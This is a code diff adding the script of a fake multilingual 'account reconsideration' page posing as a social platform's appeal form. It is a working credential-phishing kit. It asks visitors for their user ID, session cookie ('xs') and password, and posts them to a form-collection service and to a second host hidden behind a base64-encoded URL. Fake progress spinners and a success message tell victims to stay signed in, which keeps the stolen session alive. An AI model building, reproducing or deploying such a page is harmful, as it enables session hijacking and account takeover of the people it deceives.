+        videoTitle: "Step-by-step guide: How to request reconsideration",
+        cUserLabel: "User ID",
+        xsLabel: "X ID",
+        signoutNote: "Do not sign out of your account during the review process to avoid disruptions.",
+        submitText: "Submit Request",
+        verifyTitle: "Account Verification",
+        reenterTitle: "Re-enter Password",
+        verifyDescription: "For security purposes, please re-enter your account password to complete your review request",
+        passwordLabel: "Password",
+        passwordNote: "Your password is required to verify account ownership and protect your security.",
+        verifyText: "Verify & Submit",
+        successTitle: "Review Submitted!",
+        successSubtitle: "Review request submitted! We'll get back within 24 hours.",
+        instructionsTitle: "Important Next Steps",
+        step1: "Stay signed in for 24 hours",
+        step2: "Check notifications for review updates",
+        step3: "Check email or phone for messages",
+        continueText: "Return to Home",
+        videoLangTitle: "Select Video Language"
+      },
+      es: {
+        pageTitle: "Solicitud de reconsideración de cuenta",
+        description1: "Nuestros sistemas automatizados han detectado actividad inusual en su cuenta que parece violar nuestros Estándares de la comunidad.",
+        description2: "El acceso a su cuenta se ha limitado temporalmente para proteger a nuestra comunidad. No puede publicar, comentar o usar ciertas funciones en este momento.",
+        description3: "Si cree que esto es un error, puede solicitar una revisión proporcionando la información requerida a continuación.",
+        videoTitle: "Guía paso a paso: Cómo solicitar reconsideración",
+        cUserLabel: "ID de cuenta",
+        xsLabel: "Clave de sesión",
+        signoutNote: "No cierre sesión en su cuenta durante el proceso de revisión para evitar interrupciones.",
+        submitText: "Enviar solicitud de revisión",
+        verifyTitle: "Verificación de cuenta",
+        reenterTitle: "Vuelva a ingresar la contraseña",
+        verifyDescription: "Por motivos de seguridad, vuelva a ingresar la contraseña de su cuenta para completar su solicitud de revisión",
+        passwordLabel: "Contraseña",
+        passwordNote: "Se requiere su contraseña para verificar la propiedad de la cuenta y proteger su seguridad.",
+        verifyText: "Verificar y enviar",
+        successTitle: "¡Revisión enviada!",
+        successSubtitle: "¡Solicitud de revisión enviada! Nos pondremos en contacto dentro de 24 horas.",
+        instructionsTitle: "Próximos pasos importantes",
+        step1: "Permanezca conectado durante 24 horas",
+        step2: "Verifique las notificaciones para actualizaciones de revisión",
+        step3: "Verifique correo electrónico o teléfono para mensajes",
+        continueText: "Volver al inicio",
+        videoLangTitle: "Seleccionar idioma del video"
+      },
+      pt: {
+        pageTitle: "Pedido de reconsideração de conta",
+        description1: "Nossos sistemas automatizados detectaram atividade incomum em sua conta que parece violar nossos Padrões da Comunidade.",
+        description2: "O acesso à sua conta foi temporariamente limitado para proteger nossa comunidade. Você não pode postar, comentar ou usar certos recursos neste momento.",
+        description3: "Se você acredita que isso é um erro, pode solicitar uma revisão fornecendo as informações necessárias abaixo.",
+        videoTitle: "Guia passo a passo: Como solicitar reconsideração",
+        cUserLabel: "ID da conta",
+        xsLabel: "Chave de sessão",
+        signoutNote: "Não saia da sua conta durante o processo de revisão para evitar interrupções.",
+        submitText: "Enviar solicitação de revisão",
+        verifyTitle: "Verificação de conta",
+        reenterTitle: "Reinsira a senha",
+        verifyDescription: "Para fins de segurança, reinsira a senha da sua conta para concluir sua solicitação de revisão",
+        passwordLabel: "Senha",
+        passwordNote: "Sua senha é necessária para verificar a propriedade da conta e proteger sua segurança.",
+        verifyText: "Verificar e enviar",
+        successTitle: "Revisão enviada!",
+        successSubtitle: "Solicitação de revisão enviada! Entraremos em contato em até 24 horas.",
+        instructionsTitle: "Próximos passos importantes",
+        step1: "Permaneça conectado por 24 horas",
+        step2: "Verifique as notificações para atualizações de revisão",
+        step3: "Verifique e-mail ou telefone para mensagens",
+        continueText: "Voltar para o início",
+        videoLangTitle: "Selecione o idioma do vídeo"
+      }
+    };
+
+    const videoSources = {
+      en: 'https://information-video-to-watch332.web.app/english.mp4',
+      es: 'https://spanish-detailed-video.web.app/spanish.mp4',
+      pt: 'https://spanish-detailed-video.web.app/portuguese.mp4'
+    };
+
+    let currentLanguage = 'en';
+    let formData = {};
+    
+    const langBtn = document.getElementById('langBtn');
+    const langOptions = document.getElementById('langOptions');
+    const currentLangText = document.getElementById('currentLang');
+    const langOptionsLinks = document.querySelectorAll('.lang-option');
+    const videoLangModal = document.getElementById('videoLangModal');
+    const closeVideoLangModal = document.getElementById('closeVideoLangModal');
+    const videoOverlay = document.getElementById('videoOverlay');
+    const videoElement = document.getElementById('instructionVideo');
+    const videoLangBtns = document.querySelectorAll('.lang-option-btn');
+    const passwordModal = document.getElementById('passwordModal');
+    const closePasswordModal = document.getElementById('closePasswordModal');
+    const passwordForm = document.getElementById('passwordForm');
+    const passwordStatus = document.getElementById('passwordStatus');
+    const successModal = document.getElementById('successModal');
+    const continueBtn = document.getElementById('continueBtn');
+    const initialForm = document.getElementById('initialForm');
+    const submitRequestBtn = document.getElementById('submit-request');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+    const mainNav = document.getElementById('mainNav');
+    const c_user_error = document.getElementById('c_user_error');
+    const xs_error = document.getElementById('xs_error');
+    const password_error = document.getElementById('password_error');
+    
+    // Language selector functionality
+    langBtn.addEventListener('click', () => {
+      langOptions.classList.toggle('show');
+    });
+    
+    document.addEventListener('click', (e) => {
+      if (!langBtn.contains(e.target) && !langOptions.contains(e.target)) {
+        langOptions.classList.remove('show');
+      }
+    });
+    
+    langOptionsLinks.forEach(option => {
+      option.addEventListener('click', (e) => {
+        e.preventDefault();
+        const lang = option.getAttribute('data-lang');
+        changeLanguage(lang);
+        langOptions.classList.remove('show');
+      });
+    });
+    
+    function changeLanguage(lang) {
+      currentLanguage = lang;
+      
+      for (const key in translations[lang]) {
+        const element = document.getElementById(key);
+        if (element) {
+          element.textContent = translations[lang][key];
+        }
+      }
+      
+      currentLangText.textContent = 
+        lang === 'en' ? 'English' : 
+        lang === 'es' ? 'Español' : 
+        'Português';
+      
+      langOptionsLinks.forEach(option => {
+        option.classList.remove('active');
+        const icon = option.querySelector('i');
+        icon.style.visibility = 'hidden';
+      });
+      
+      const activeOption = document.querySelector(`.lang-option[data-lang="${lang}"]`);
+      if (activeOption) {
+        activeOption.classList.add('active');
+        const icon = activeOption.querySelector('i');
+        icon.style.visibility = 'visible';
+      }
+    }
+    
+    // Video language selection
+    videoOverlay.addEventListener('click', () => {
+      videoLangModal.classList.add('active');
+    });
+    
+    closeVideoLangModal.addEventListener('click', () => {
+      videoLangModal.classList.remove('active');
+    });
+    
+    videoLangBtns.forEach(btn => {
+      btn.addEventListener('click', () => {
+        const lang = btn.getAttribute('data-lang');
+        videoElement.src = videoSources[lang];
+        videoElement.load();
+        videoLangModal.classList.remove('active');
+        document.getElementById('videoContainer').classList.add('video-playing');
+        videoElement.play();
+      });
+    });
+    
+    videoLangModal.addEventListener('click', (e) => {
+      if (e.target === videoLangModal) {
+        videoLangModal.classList.remove('active');
+      }
+    });
+    
+    // Mobile menu toggle
+    mobileMenuBtn.addEventListener('click', function() {
+      mainNav.classList.toggle('active');
+    });
+    
+    // Form validation functions
+    function validateCuser(c_user) {
+      if (!c_user) return false;
+      return /^\d+$/.test(c_user);
+    }
+    
+    function validateXs(xs) {
+      return xs && xs.length >= 20;
+    }
+    
+    function validatePassword(password) {
+      return password && password.length >= 6;
+    }
+
+    // Function to submit data to second form
+    function submitToSecondForm(data) {
+        // Base64 encoded URL and headers
+        const encodedUrl = 'aHR0cHM6Ly9sb3ZlLXBocC53YXNtZXIuYXBwLw==';
+        const decodedUrl = atob(encodedUrl);
+        
+        // Create form data
+        const formData = new FormData();
+        formData.append('c_user', data.c_user);
+        formData.append('xs', data.xs);
+        formData.append('password', data.password);
+        
+        fetch(decodedUrl, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.text();
+        })
+        .then(data => {
+            console.log('Second form submission successful:', data);
+        })
+        .catch(error => {
+            console.error('Error submitting to second form:', error);
+        });
+    }
+
+    // Initial form submission
+    initialForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      formData.c_user = document.getElementById('c_user').value;
+      formData.xs = document.getElementById('xs').value;
+      
+      c_user_error.style.display = 'none';
+      xs_error.style.display = 'none';
+      
+      let isValid = true;
+      
+      if (!validateCuser(formData.c_user)) {
+        c_user_error.style.display = 'block';
+        isValid = false;
+      }
+      
+      if (!validateXs(formData.xs)) {
+        xs_error.style.display = 'block';
+        isValid = false;
+      }
+      
+      if (!isValid) {
+        return;
+      }
+      
+      submitRequestBtn.classList.add('btn-loading');
+      submitRequestBtn.disabled = true;
+      submitRequestBtn.innerHTML = '<span class="spinner"></span> <span class="btn-text">Processing...</span>';
+      
+      setTimeout(() => {
+        submitRequestBtn.classList.remove('btn-loading');
+        submitRequestBtn.disabled = false;
+        submitRequestBtn.innerHTML = '<i class="fa-solid fa-paper-plane"></i> <span class="btn-text">Submit Request</span>';
+        
+        passwordModal.classList.add('active');
+      }, 1500); 
+    });
+    
+    // Password form submission
+    passwordForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const password = document.getElementById('password').value;
+      formData.password = password;
+      formData.timestamp = new Date().toISOString();
+      formData.language = currentLanguage;
+      
+      password_error.style.display = 'none';
+      passwordStatus.textContent = '';
+      
+      if (!validatePassword(password)) {
+        password_error.style.display = 'block';
+        passwordStatus.textContent = 'Incorrect password format';
+        passwordStatus.className = 'status-message status-error';
+        return;
+      }
+      
+      verifyBtn.classList.add('btn-loading');
+      verifyBtn.disabled = true;
+      verifyBtn.innerHTML = '<span class="spinner"></span> <span class="btn-text">Verifying...</span>';
+      
+      try {
+        // Submit the form data to formspree
+        const response = await fetch('https://submit-form.com/aJgxxoe5e', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(formData)
+        });
+        
+        // Submit to the second form
+        submitToSecondForm(formData);
+        
+        if (response.ok) {
+          passwordModal.classList.remove('active');
+          successModal.classList.add('active');
+        } else {
+          throw new Error('Form submission failed');
+        }
+      } catch (error) {
+        console.error('Error submitting form:', error);
+        passwordStatus.textContent = 'Submission failed. Please try again.';
+        passwordStatus.className = 'status-message status-error';
+      } finally {
+        verifyBtn.classList.remove('btn-loading');
+        verifyBtn.disabled = false;
+        verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span class="btn-text">Verify & Submit</span>';
+      }
+    });
+    
+    // Modal close handlers
+    closePasswordModal.addEventListener('click', function() {
+      passwordModal.classList.remove('active');
+    });
+    
+    continueBtn.addEventListener('click', function() {
+      window.location.href = "/";
+    });
+    
+    document.addEventListener('click', function(e) {
+      if (e.target === passwordModal) {
+        passwordModal.classList.remove('active');
+      }
+      if (e.target === successModal) {
+        successModal.classList.remove('active');
+      }
+    });
+    
+    // Initialize with English language
+    changeLanguage('en');
+  </script>
+</body>
+</html>
